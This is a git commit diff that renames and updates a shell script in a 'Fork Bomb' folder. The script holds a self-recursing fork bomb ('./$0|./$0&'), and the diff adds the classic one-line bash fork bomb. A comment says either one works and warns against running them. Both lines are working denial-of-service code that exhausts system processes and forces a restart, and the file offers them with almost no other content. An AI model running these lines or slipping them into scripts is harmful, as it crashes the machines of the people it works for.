4d004bf2ac5a4011dcfacaf3ee71ae35fd6ca34e
JISHNU PRAMOD <39820988+jishnupramod@users.noreply.github.com>
2020-10-01 12:52:59 +0530

    Update and rename forBomb.sh to forkBomb.sh

--- Fork Bomb/forkBomb.sh
+++ Fork Bomb/forkBomb.sh
@@ -1,3 +1,8 @@
 #shell script version of a fork bomb
 #WARNING: DO NOT RUN THIS, will need a system restart
 ./$0|./$0&
+
+#Another implementation of fork bomb
+:() { :|:& }; :
+
+#Either of the above 2 acts as fork bomb. 
